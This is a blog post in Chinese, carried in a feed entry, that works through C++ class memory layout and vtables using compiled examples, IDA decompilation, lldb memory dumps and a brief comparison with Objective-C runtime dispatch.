    <content type="html"><![CDATA[<h3 id="C-类结构以及vtable分析"><a href="#C-类结构以及vtable分析" class="headerlink" title="C++类结构以及vtable分析"></a>C++类结构以及vtable分析</h3><blockquote><p>通过实验自己对一些C++数据结构的理解</p></blockquote><h3 id="实验一"><a href="#实验一" class="headerlink" title="实验一"></a>实验一</h3><pre><code class="c++">#include &lt;iostream&gt;using namespace std;// 基类class Shape {   public:      void setWidth(int w)      {         width = w;      }      void setHeight(int h)      {         height = h;      }   protected:      int width;      int height;};// 派生类class Rectangle: public Shape{   public:      int getArea()      {          return (width * height);       }};int main(void){   Rectangle Rect;   Rect.setWidth(5);   Rect.setHeight(7);   // 输出对象的面积   cout &lt;&lt; &quot;Total area: &quot; &lt;&lt; Rect.getArea() &lt;&lt; endl;   return 0;}</code></pre><p>上面的代码编译完成后，在ida中反汇编如下</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  __int64 v3; // ST08_8  unsigned int v4; // eax  char v6; // [rsp+10h] [rbp-20h]  int v7; // [rsp+1Ch] [rbp-14h]  __int64 (__fastcall *v8)(_QWORD); // [rsp+20h] [rbp-10h]  __int64 v9; // [rsp+28h] [rbp-8h]  v7 = 0;  Shape::setWidth((Shape *)&amp;v6, 5);  Shape::setHeight((Shape *)&amp;v6, 7);  v3 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total area: &quot;);  v4 = Rectangle::getArea((Rectangle *)&amp;v6);  v9 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v3, v4);  v8 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;;  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v9);  return 0;}</code></pre><p>Rect内存布局</p><pre><code>(lldb) x/20b $rbp-0x200x7ffeefbff560: 0x05 0x00 0x00 0x00 0x07 0x00 0x00 0x000x7ffeefbff568: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00</code></pre><p>能得到的结论是，在编译完后，子类Rectangle的方法调用都编译成父类Shape方法调用，这是在编译时就决定了的。把子类对象和参数合并作为参数传入父类方法。这里仅仅是对子类对象另个偏移值做操作。</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  void *v3; // ST10_8  __int64 v4; // ST08_8  unsigned int v5; // eax  __int64 v6; // ST38_8  v3 = (void *)operator new(8uLL);  memset(v3, 0, 8uLL);  Shape::setWidth((Shape *)v3, 5);  Shape::setHeight((Shape *)v3, 7);  v4 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total area: &quot;);  v5 = Rectangle::getArea((Rectangle *)v3);  v6 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v4, v5);  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v6);  return 0;}</code></pre><p>这里将 Rectangle Rect改为Rectangle *Rect = new Rectangle()在堆上申请内存可以看出，在类初始化的时候，仅仅申请了一块8字节空间，正好是两个int的大小，仅此而已。</p><h3 id="实验二"><a href="#实验二" class="headerlink" title="实验二"></a>实验二</h3><pre><code class="c++">#include &lt;iostream&gt;using namespace std;// 基类class Shape {public:   // 提供接口框架的纯虚函数   virtual int getArea() = 0;   void setWidth(int w)   {      width = w;   }   void setHeight(int h)   {      height = h;   }protected:   int width;   int height;};// 派生类class Rectangle: public Shape{public:   int getArea()   {       return (width * height);    }};class Triangle: public Shape{public:   int getArea()   {       return (width * height)/2;    }};int main(void){   Rectangle Rect;   Triangle  Tri;   Rect.setWidth(5);   Rect.setHeight(7);   // 输出对象的面积   cout &lt;&lt; &quot;Total Rectangle area: &quot; &lt;&lt; Rect.getArea() &lt;&lt; endl;   Tri.setWidth(5);   Tri.setHeight(7);   // 输出对象的面积   cout &lt;&lt; &quot;Total Triangle area: &quot; &lt;&lt; Tri.getArea() &lt;&lt; endl;    return 0;}</code></pre><p>上面的代码编译完成后，在ida中反汇编如下</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  __int64 v3; // ST20_8  unsigned int v4; // eax  __int64 v5; // ST10_8  unsigned int v6; // eax  char v8; // [rsp+28h] [rbp-48h]  char v9; // [rsp+38h] [rbp-38h]  int v10; // [rsp+4Ch] [rbp-24h]  __int64 (__fastcall *v11)(_QWORD); // [rsp+50h] [rbp-20h]  __int64 v12; // [rsp+58h] [rbp-18h]  __int64 (__fastcall *v13)(_QWORD); // [rsp+60h] [rbp-10h]  __int64 v14; // [rsp+68h] [rbp-8h]  v10 = 0;  Rectangle::Rectangle((Rectangle *)&amp;v9);  Triangle::Triangle((Triangle *)&amp;v8);  Shape::setWidth((Shape *)&amp;v9, 5);  Shape::setHeight((Shape *)&amp;v9, 7);  v3 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total Rectangle area: &quot;);  v4 = Rectangle::getArea((Rectangle *)&amp;v9);  v12 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v3, v4);  v11 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;;  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v12);  Shape::setWidth((Shape *)&amp;v8, 5);  Shape::setHeight((Shape *)&amp;v8, 7);  v5 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total Triangle area: &quot;);  v6 = Triangle::getArea((Triangle *)&amp;v8);  v14 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v5, v6);  v13 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;;  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v14);  return 0;}</code></pre><p>这里与实验一明显不同在于，在初始化一个对象的时候会调用其构建方法。其反汇编代码如下</p><pre><code class="c++">__int64 *__fastcall Rectangle::Rectangle(Rectangle *this){  __int64 *result; // rax  Shape::Shape(this);  result = &amp;`vtable for&#39;Rectangle + 2;  *(_QWORD *)this = &amp;`vtable for&#39;Rectangle + 2;  return result;}</code></pre><p>这里发现里面还调用了父类的构建方法，父类构建方法反汇编代码如下</p><pre><code class="c++">__int64 *__fastcall Shape::Shape(Shape *this){  __int64 *result; // rax  result = &amp;`vtable for&#39;Shape + 2;  *(_QWORD *)this = &amp;`vtable for&#39;Shape + 2;  return result;}</code></pre><p>其实这两个构建方法就是对传入对象this指针赋值操作，在经过Shape::Shape(this)后其实this指针的64字节大小值为父类Shape的虚函数表地址。然后又被重新赋值为Rectangle自己的虚函数表地址。</p><p>这里的虚函数表地址，本质就是_DATA段的一个数据结构。</p><p>Rect的内存布局为</p><pre><code>(lldb) x/20b $rbp-0x380x7ffeefbff548: 0x20 0x21 0x00 0x00 0x01 0x00 0x00 0x000x7ffeefbff550: 0x05 0x00 0x00 0x00 0x07 0x00 0x00 0x00</code></pre><p>这里可以看到前64字节为虚函数表地址，后面两个32字节分别是其width和height</p><p>去ida中查看该地址</p><pre><code class="c++">__data:0000000100002110 ; `vtable for&#39;Rectangle__data:0000000100002110 __ZTV9Rectangle dq 0                    ; DATA XREF: __got:__ZTV9Rectangle_ptr↑o__data:0000000100002110                                         ; offset to this__data:0000000100002118                 dq offset __ZTI9Rectangle ; `typeinfo for&#39;Rectangle__data:0000000100002120                 dq offset __ZN9Rectangle7getAreaEv ; Rectangle::getArea(void)</code></pre><p>就是_DATA段中的数据结构，现在我们可以清晰的理解C++类在内存的数据结构了。</p><h3 id="一点理解"><a href="#一点理解" class="headerlink" title="一点理解"></a>一点理解</h3><p>C++这个语言特性非常多，如果不能理解其本质很容易造成bug。这里想把C++和OC做一个简单的对比，C++的很多实现都是在编译时就确定的，C++中的类我更愿意理解成为C中的结构体。而OC这语言，大多都是在运行时才能确定，方法转化为消息处理。在可执行文件中也有专门的段存储其复杂的类数据结构，也因为这样，OC在运行时可以做很多hack操作，比如hook其方法实现等等。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;C-类结构以及vtable分析&quot;&gt;&lt;a href=&quot;#C-类结构以及vtable分析&quot; class=&quot;headerlink&quot; title=&quot;C++类结构以及vtable分析&quot;&gt;&lt;/a&gt;C++类结构以及vtable分析&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;通过实
      
    
    </summary>
    
      <category term="C++" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/C/"/>
    
    
      <category term="C++" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/C/"/>
    
  </entry>
  
</feed>
